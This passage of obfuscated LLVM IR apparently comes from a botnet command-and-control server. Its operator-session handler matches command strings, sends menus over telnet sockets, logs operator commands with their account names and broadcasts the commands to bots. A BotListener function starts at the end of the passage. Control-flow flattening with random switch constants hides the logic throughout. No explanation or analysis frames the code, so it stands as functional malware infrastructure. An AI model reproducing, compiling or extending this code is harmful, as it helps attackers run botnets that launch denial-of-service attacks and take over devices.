  %613 = call i64 @strlen(i8* %612) #8
  %614 = call i64 @send(i32 %610, i8* %611, i64 %613, i32 16384)
  %615 = icmp eq i64 %614, -1
  %616 = select i1 %615, i32 919011593, i32 380123995
  store i32 %616, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i32, i32* %4, align 4
  %620 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %621 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %622 = call i64 @strlen(i8* %621) #8
  %623 = call i64 @send(i32 %619, i8* %620, i64 %622, i32 16384)
  %624 = icmp eq i64 %623, -1
  %625 = select i1 %624, i32 829758022, i32 -444113772
  store i32 %625, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = load i32, i32* %4, align 4
  %629 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %630 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %631 = call i64 @strlen(i8* %630) #8
  %632 = call i64 @send(i32 %628, i8* %629, i64 %631, i32 16384)
  %633 = icmp eq i64 %632, -1
  %634 = select i1 %633, i32 280308035, i32 -2100934857
  store i32 %634, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  %637 = load i32, i32* %4, align 4
  %638 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %639 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %640 = call i64 @strlen(i8* %639) #8
  %641 = call i64 @send(i32 %637, i8* %638, i64 %640, i32 16384)
  %642 = icmp eq i64 %641, -1
  %643 = select i1 %642, i32 204865374, i32 633174177
  store i32 %643, i32* %switchVar
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32, i32* %4, align 4
  %647 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %648 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %649 = call i64 @strlen(i8* %648) #8
  %650 = call i64 @send(i32 %646, i8* %647, i64 %649, i32 16384)
  %651 = icmp eq i64 %650, -1
  %652 = select i1 %651, i32 1582662598, i32 -873897785
  store i32 %652, i32* %switchVar
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i8*, i8** %3, align 8
  %656 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %655) #7
  %657 = load i32, i32* %4, align 4
  %658 = call i64 @send(i32 %657, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %659 = icmp eq i64 %658, -1
  %660 = select i1 %659, i32 -699587858, i32 1322534521
  store i32 %660, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %665 = call i8* @strstr(i8* %664, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0)) #8
  %666 = icmp ne i8* %665, null
  %667 = select i1 %666, i32 1856069745, i32 -1776664024
  store i32 %667, i32* %switchVar
  br label %loopEnd

; <label>:668:                                    ; preds = %loopEntry
  %669 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %669, i8 0, i64 2048, i32 16, i1 false)
  %670 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  %671 = call i32 (i8*, i8*, ...) @sprintf(i8* %670, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.64, i32 0, i32 0)) #7
  %672 = load i32, i32* %4, align 4
  %673 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  %674 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  %675 = call i64 @strlen(i8* %674) #8
  %676 = call i64 @send(i32 %672, i8* %673, i64 %675, i32 16384)
  %677 = icmp eq i64 %676, -1
  %678 = select i1 %677, i32 1259809072, i32 -1268359697
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = load i32, i32* %4, align 4
  %682 = call i64 @send(i32 %681, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %683 = icmp eq i64 %682, -1
  %684 = select i1 %683, i32 1541733067, i32 381243654
  store i32 %684, i32* %switchVar
  br label %loopEnd

; <label>:685:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %689 = call i8* @strstr(i8* %688, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i32 0, i32 0)) #8
  %690 = icmp ne i8* %689, null
  %691 = select i1 %690, i32 -1860284401, i32 -1505928732
  store i32 %691, i32* %switchVar
  br label %loopEnd

; <label>:692:                                    ; preds = %loopEntry
  %693 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %693, i8 0, i64 2048, i32 16, i1 false)
  %694 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %695 = call i32 (i8*, i8*, ...) @sprintf(i8* %694, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i32 0, i32 0)) #7
  %696 = load i32, i32* %4, align 4
  %697 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %698 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %699 = call i64 @strlen(i8* %698) #8
  %700 = call i64 @send(i32 %696, i8* %697, i64 %699, i32 16384)
  %701 = icmp eq i64 %700, -1
  %702 = select i1 %701, i32 568371587, i32 1477970487
  store i32 %702, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load i32, i32* %4, align 4
  %706 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %707 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %708 = call i64 @strlen(i8* %707) #8
  %709 = call i64 @send(i32 %705, i8* %706, i64 %708, i32 16384)
  %710 = icmp eq i64 %709, -1
  %711 = select i1 %710, i32 -1301773804, i32 -542013047
  store i32 %711, i32* %switchVar
  br label %loopEnd

; <label>:712:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = load i32, i32* %4, align 4
  %715 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %716 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %717 = call i64 @strlen(i8* %716) #8
  %718 = call i64 @send(i32 %714, i8* %715, i64 %717, i32 16384)
  %719 = icmp eq i64 %718, -1
  %720 = select i1 %719, i32 -901616115, i32 -2084009464
  store i32 %720, i32* %switchVar
  br label %loopEnd

; <label>:721:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:722:                                    ; preds = %loopEntry
  %723 = load i32, i32* %4, align 4
  %724 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %725 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %726 = call i64 @strlen(i8* %725) #8
  %727 = call i64 @send(i32 %723, i8* %724, i64 %726, i32 16384)
  %728 = icmp eq i64 %727, -1
  %729 = select i1 %728, i32 909478290, i32 510713776
  store i32 %729, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  %732 = load i32, i32* %4, align 4
  %733 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %734 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %735 = call i64 @strlen(i8* %734) #8
  %736 = call i64 @send(i32 %732, i8* %733, i64 %735, i32 16384)
  %737 = icmp eq i64 %736, -1
  %738 = select i1 %737, i32 -1385561681, i32 -650621552
  store i32 %738, i32* %switchVar
  br label %loopEnd

; <label>:739:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  %741 = load i32, i32* %4, align 4
  %742 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %743 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %744 = call i64 @strlen(i8* %743) #8
  %745 = call i64 @send(i32 %741, i8* %742, i64 %744, i32 16384)
  %746 = icmp eq i64 %745, -1
  %747 = select i1 %746, i32 1537192576, i32 -1744522984
  store i32 %747, i32* %switchVar
  br label %loopEnd

; <label>:748:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:749:                                    ; preds = %loopEntry
  %750 = load i32, i32* %4, align 4
  %751 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %752 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %753 = call i64 @strlen(i8* %752) #8
  %754 = call i64 @send(i32 %750, i8* %751, i64 %753, i32 16384)
  %755 = icmp eq i64 %754, -1
  %756 = select i1 %755, i32 -1352202265, i32 -53188601
  store i32 %756, i32* %switchVar
  br label %loopEnd

; <label>:757:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:758:                                    ; preds = %loopEntry
  %759 = load i32, i32* %4, align 4
  %760 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %761 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %762 = call i64 @strlen(i8* %761) #8
  %763 = call i64 @send(i32 %759, i8* %760, i64 %762, i32 16384)
  %764 = icmp eq i64 %763, -1
  %765 = select i1 %764, i32 -195403853, i32 1118946659
  store i32 %765, i32* %switchVar
  br label %loopEnd

; <label>:766:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:767:                                    ; preds = %loopEntry
  %768 = load i32, i32* %4, align 4
  %769 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %770 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %771 = call i64 @strlen(i8* %770) #8
  %772 = call i64 @send(i32 %768, i8* %769, i64 %771, i32 16384)
  %773 = icmp eq i64 %772, -1
  %774 = select i1 %773, i32 -695787237, i32 1431808597
  store i32 %774, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:776:                                    ; preds = %loopEntry
  %777 = load i32, i32* %4, align 4
  %778 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %779 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %780 = call i64 @strlen(i8* %779) #8
  %781 = call i64 @send(i32 %777, i8* %778, i64 %780, i32 16384)
  %782 = icmp eq i64 %781, -1
  %783 = select i1 %782, i32 614051173, i32 670546692
  store i32 %783, i32* %switchVar
  br label %loopEnd

; <label>:784:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:785:                                    ; preds = %loopEntry
  %786 = load i32, i32* %4, align 4
  %787 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %788 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %789 = call i64 @strlen(i8* %788) #8
  %790 = call i64 @send(i32 %786, i8* %787, i64 %789, i32 16384)
  %791 = icmp eq i64 %790, -1
  %792 = select i1 %791, i32 -1775226221, i32 -1702643348
  store i32 %792, i32* %switchVar
  br label %loopEnd

; <label>:793:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:794:                                    ; preds = %loopEntry
  store i32 -1779986395, i32* %switchVar
  br label %loopEnd

; <label>:795:                                    ; preds = %loopEntry
  %796 = load i32, i32* %4, align 4
  %797 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %798 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %799 = call i64 @strlen(i8* %798) #8
  %800 = call i64 @send(i32 %796, i8* %797, i64 %799, i32 16384)
  %801 = icmp eq i64 %800, -1
  %802 = select i1 %801, i32 2053022746, i32 -748142717
  store i32 %802, i32* %switchVar
  br label %loopEnd

; <label>:803:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:804:                                    ; preds = %loopEntry
  %805 = load i32, i32* %4, align 4
  %806 = call i64 @send(i32 %805, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %807 = icmp eq i64 %806, -1
  %808 = select i1 %807, i32 1749731516, i32 -1470992644
  store i32 %808, i32* %switchVar
  br label %loopEnd

; <label>:809:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:810:                                    ; preds = %loopEntry
  store i32 1908708685, i32* %switchVar
  br label %loopEnd

; <label>:811:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:812:                                    ; preds = %loopEntry
  %813 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %814 = call i8* @strstr(i8* %813, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
  %815 = icmp ne i8* %814, null
  %816 = select i1 %815, i32 -544123589, i32 -1038178638
  store i32 %816, i32* %switchVar
  br label %loopEnd

; <label>:817:                                    ; preds = %loopEntry
  %818 = load i8*, i8** %3, align 8
  %819 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %818) #7
  %820 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %821 = call i32 (i8*, i8*, ...) @sprintf(i8* %820, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.68, i32 0, i32 0)) #7
  %822 = load i32, i32* %4, align 4
  %823 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %824 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %825 = call i64 @strlen(i8* %824) #8
  %826 = call i64 @send(i32 %822, i8* %823, i64 %825, i32 16384)
  %827 = icmp eq i64 %826, -1
  %828 = select i1 %827, i32 -856812949, i32 362799522
  store i32 %828, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:830:                                    ; preds = %loopEntry
  %831 = load i8*, i8** %3, align 8
  %832 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %831) #7
  %833 = load i32, i32* %4, align 4
  %834 = call i64 @send(i32 %833, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %835 = icmp eq i64 %834, -1
  %836 = select i1 %835, i32 -1272466747, i32 -1124478548
  store i32 %836, i32* %switchVar
  br label %loopEnd

; <label>:837:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:838:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:839:                                    ; preds = %loopEntry
  %840 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %841 = call i8* @strstr(i8* %840, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %842 = icmp ne i8* %841, null
  %843 = select i1 %842, i32 798567121, i32 874084447
  store i32 %843, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  %845 = load i8*, i8** %3, align 8
  %846 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %845) #7
  %847 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %848 = call i32 (i8*, i8*, ...) @sprintf(i8* %847, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.70, i32 0, i32 0)) #7
  %849 = load i32, i32* %4, align 4
  %850 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %851 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %852 = call i64 @strlen(i8* %851) #8
  %853 = call i64 @send(i32 %849, i8* %850, i64 %852, i32 16384)
  %854 = icmp eq i64 %853, -1
  %855 = select i1 %854, i32 -1034381694, i32 390711943
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:857:                                    ; preds = %loopEntry
  %858 = load i8*, i8** %3, align 8
  %859 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %858) #7
  %860 = load i32, i32* %4, align 4
  %861 = call i64 @send(i32 %860, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %862 = icmp eq i64 %861, -1
  %863 = select i1 %862, i32 -1439198122, i32 -678253600
  store i32 %863, i32* %switchVar
  br label %loopEnd

; <label>:864:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:865:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:866:                                    ; preds = %loopEntry
  %867 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %868 = call i8* @strstr(i8* %867, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #8
  %869 = icmp ne i8* %868, null
  %870 = select i1 %869, i32 845530474, i32 760042236
  store i32 %870, i32* %switchVar
  br label %loopEnd

; <label>:871:                                    ; preds = %loopEntry
  %872 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %872, i8 0, i64 2048, i32 16, i1 false)
  %873 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  %874 = load i32, i32* %5, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %875
  %877 = getelementptr inbounds %struct.login_info, %struct.login_info* %876, i32 0, i32 0
  %878 = getelementptr inbounds [20 x i8], [20 x i8]* %877, i32 0, i32 0
  %879 = call i32 (i8*, i8*, ...) @sprintf(i8* %873, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.72, i32 0, i32 0), i8* %878) #7
  %880 = load i32, i32* %4, align 4
  %881 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  %882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  %883 = call i64 @strlen(i8* %882) #8
  %884 = call i64 @send(i32 %880, i8* %881, i64 %883, i32 16384)
  %885 = icmp eq i64 %884, -1
  %886 = select i1 %885, i32 1604995869, i32 560252558
  store i32 %886, i32* %switchVar
  br label %loopEnd

; <label>:887:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:888:                                    ; preds = %loopEntry
  %889 = call i32 @sleep(i32 5)
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  %891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %891)
  %892 = load i32, i32* %4, align 4
  %893 = call i64 @send(i32 %892, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 11, i32 16384)
  %894 = icmp eq i64 %893, -1
  %895 = select i1 %894, i32 606120163, i32 -571384955
  store i32 %895, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  %898 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %899 = call i64 @strlen(i8* %898) #8
  %900 = icmp eq i64 %899, 0
  %901 = select i1 %900, i32 92113296, i32 943982239
  store i32 %901, i32* %switchVar
  br label %loopEnd

; <label>:902:                                    ; preds = %loopEntry
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  %904 = load i32, i32* %5, align 4
  %905 = sext i32 %904 to i64
  %906 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %905
  %907 = getelementptr inbounds %struct.login_info, %struct.login_info* %906, i32 0, i32 0
  %908 = getelementptr inbounds [20 x i8], [20 x i8]* %907, i32 0, i32 0
  %909 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %910 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* %908, i8* %909)
  %911 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0))
  store %struct._IO_FILE* %911, %struct._IO_FILE** %57, align 8
  %912 = call i64 @time(i64* null) #7
  store i64 %912, i64* %58, align 8
  %913 = call %struct.tm* @gmtime(i64* %58) #7
  store %struct.tm* %913, %struct.tm** %59, align 8
  %914 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i32 0, i32 0
  %915 = load %struct.tm*, %struct.tm** %59, align 8
  %916 = call i64 @strftime(i8* %914, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), %struct.tm* %915) #7
  %917 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %918 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i32 0, i32 0
  %919 = load i32, i32* %5, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %920
  %922 = getelementptr inbounds %struct.login_info, %struct.login_info* %921, i32 0, i32 0
  %923 = getelementptr inbounds [20 x i8], [20 x i8]* %922, i32 0, i32 0
  %924 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %925 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %917, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i8* %918, i8* %923, i8* %924)
  %926 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %927 = call i32 @fclose(%struct._IO_FILE* %926)
  %928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %929 = load i32, i32* %4, align 4
  %930 = load i32, i32* %5, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %931
  %933 = getelementptr inbounds %struct.login_info, %struct.login_info* %932, i32 0, i32 0
  %934 = getelementptr inbounds [20 x i8], [20 x i8]* %933, i32 0, i32 0
  call void @broadcast(i8* %928, i32 %929, i8* %934)
  %935 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %935, i8 0, i64 2048, i32 16, i1 false)
  store i32 1144000531, i32* %switchVar
  br label %loopEnd

; <label>:936:                                    ; preds = %loopEntry
  store i32 -1820737116, i32* %switchVar
  br label %loopEnd

; <label>:937:                                    ; preds = %loopEntry
  %938 = load i32, i32* %4, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %939
  %941 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %940, i32 0, i32 0
  store i32 0, i32* %941, align 4
  %942 = load i32, i32* %4, align 4
  %943 = call i32 @close(i32 %942)
  %944 = load volatile i32, i32* @OperatorsConnected, align 4
  %945 = add nsw i32 %944, -1
  store volatile i32 %945, i32* @OperatorsConnected, align 4
  store i32 -885566018, i32* %switchVar
  br label %loopEnd

; <label>:946:                                    ; preds = %loopEntry
  %947 = load i8*, i8** %2, align 8
  ret i8* %947

loopEnd:                                          ; preds = %937, %936, %903, %902, %897, %896, %890, %888, %887, %871, %866, %865, %864, %857, %856, %844, %839, %838, %837, %830, %829, %817, %812, %811, %810, %809, %804, %803, %795, %794, %793, %785, %784, %776, %775, %767, %766, %758, %757, %749, %748, %740, %739, %731, %730, %722, %721, %713, %712, %704, %703, %692, %687, %686, %685, %680, %679, %668, %663, %662, %661, %654, %653, %645, %644, %636, %635, %627, %626, %618, %617, %597, %592, %591, %590, %583, %582, %574, %573, %565, %564, %556, %555, %547, %546, %538, %537, %529, %528, %520, %519, %511, %510, %502, %501, %493, %492, %484, %483, %475, %474, %466, %465, %457, %456, %448, %447, %439, %438, %391, %386, %385, %384, %379, %378, %365, %360, %359, %358, %353, %352, %339, %334, %328, %321, %320, %319, %314, %313, %305, %304, %303, %295, %294, %286, %285, %277, %276, %268, %267, %259, %258, %250, %249, %241, %240, %232, %231, %223, %222, %184, %182, %181, %171, %170, %165, %164, %162, %161, %150, %149, %143, %142, %137, %116, %115, %109, %108, %103, %88, %82, %80, %75, %69, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotListener(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* %4, align 4
  store i32 %11, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1372831564, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1372831564, label %first
    i32 -356725959, label %14
    i32 -1308216684, label %15
    i32 -1162485909, label %29
    i32 -2036138248, label %30
    i32 -616624832, label %33
    i32 1407752441, label %40
    i32 -1780869310, label %41
    i32 -1051188606, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %12 = icmp slt i32 %.reload, 0
  %13 = select i1 %12, i32 -356725959, i32 -1308216684
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.78, i32 0, i32 0))
  store i32 -1308216684, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
